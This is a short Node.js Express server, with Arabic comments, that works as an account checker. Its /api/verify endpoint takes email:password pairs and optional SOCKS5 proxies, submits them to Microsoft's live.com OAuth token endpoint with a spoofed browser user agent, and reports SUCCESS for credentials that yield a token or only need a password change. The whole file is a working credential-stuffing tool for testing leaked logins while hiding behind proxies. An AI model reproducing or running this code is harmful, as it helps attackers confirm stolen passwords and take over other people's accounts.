const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');
const { SocksProxyAgent } = require('socks-proxy-agent');
const app = express();

app.use(cors());
app.use(express.json());

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/api/verify', async (req, res) => {
    const { account, proxy } = req.body;
    if (!account || !account.includes(':')) return res.status(400).json({ status: 'FAILED' });

    const [email, password] = account.split(':');
    
    const axiosConfig = {
        timeout: 15000,
        validateStatus: false,
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
    };

    if (proxy && proxy.includes(':')) {
        try {
            axiosConfig.httpsAgent = new SocksProxyAgent(`socks5://${proxy.trim()}`);
        } catch (e) { console.log("Proxy Error"); }
    }

    try {
        // فحص عبر بوابة الهوية الرسمية لمايكروسوفت
        const params = new URLSearchParams({
            'login': email,
            'passwd': password,
            'client_id': '000000004C12AE29',
            'grant_type': 'password',
            'scope': 'service::user.read::ABI'
        });

        const response = await axios.post('https://login.live.com/oauth20_token.srf', params, axiosConfig);
        
        // تحليل الاستجابة
        const data = response.data;

        // إذا نجح الدخول أو طلب توكن
        if (data.access_token || data.refresh_token) {
            return res.json({ status: 'SUCCESS' });
        } 
        
        // التحقق من أخطاء معينة تعني أن الحساب شغال لكن يحتاج إجراء (مثل تغيير كلمة السر)
        if (data.error === 'invalid_grant' && data.error_description && data.error_description.includes('AADSTS50055')) {
             return res.json({ status: 'SUCCESS' }); // شغال لكن كلمة السر منتهية
        }

        res.json({ status: 'FAILED' });

    } catch (e) {
        res.json({ status: 'FAILED' });
    }
});

module.exports = app;
